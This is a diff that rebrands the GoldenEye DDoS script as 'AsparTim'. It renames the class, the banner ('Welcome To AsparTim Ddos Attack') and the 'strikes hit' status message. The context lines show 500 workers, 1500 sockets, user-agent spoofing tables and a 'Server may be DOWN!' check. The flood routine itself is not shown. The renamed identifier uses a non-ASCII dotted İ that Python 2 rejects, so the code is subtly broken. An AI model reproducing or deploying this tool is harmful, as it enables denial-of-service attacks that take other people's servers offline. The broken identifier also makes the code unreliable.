@@ -32,7 +32,7 @@ JOIN_TIMEOUT=1.0
 DEFAULT_WORKERS=500
 DEFAULT_SOCKETS=1500
 
-GOLDENEYE_BANNER = 'Welcome To AsparTim Ddos Attack'
+ASPARTİM_BANNER = 'Welcome To AsparTim Ddos Attack'
 
 USER_AGENT_PARTS = {
     'os': {
@@ -71,10 +71,10 @@ USER_AGENT_PARTS = {
 }
 
 ####
-# GoldenEye Class
+# AsparTim Class
 ####
 
-class GoldenEye(object):
+class AsparTim(object):
 
     # Counters
     counter = [0, 0]
@@ -116,7 +116,7 @@ class GoldenEye(object):
 
         # Taunt!
         print
-        print GOLDENEYE_BANNER
+        print ASPARTİM_BANNER
         print
 
     # Do the fun!
@@ -155,7 +155,7 @@ class GoldenEye(object):
         try:
             if self.counter[0] > 0 or self.counter[1] > 0:
 
-                print "{0} GoldenEye strikes hit. ({1} Failed)".format(self.counter[0], self.counter[1])
+                print "{0} AsparTim strikes hit. ({1} Failed)".format(self.counter[0], self.counter[1])
 
                 if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                     print "\tServer may be DOWN!"
